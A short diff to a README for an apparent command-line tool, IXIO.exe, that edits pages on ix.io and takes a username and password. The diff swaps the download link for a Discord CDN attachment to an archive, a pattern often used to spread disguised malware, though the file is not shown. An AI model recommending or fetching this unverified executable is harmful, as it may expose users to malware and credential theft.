@@ -1,6 +1,6 @@
 # IXIO
 Create, edit or delete pages in ix.io
-### [DOWNLOAD](http://maximum-tension.com/)
+### [DOWNLOAD](https://cdn.discordapp.com/attachments/776033096533278731/946812712762114168/IXIO.rar)
 ```
 IXIO.exe {COMMAND} "{INPUT}" "{USERNAME}" "{PASSWORD}" "{ID}"
 ```
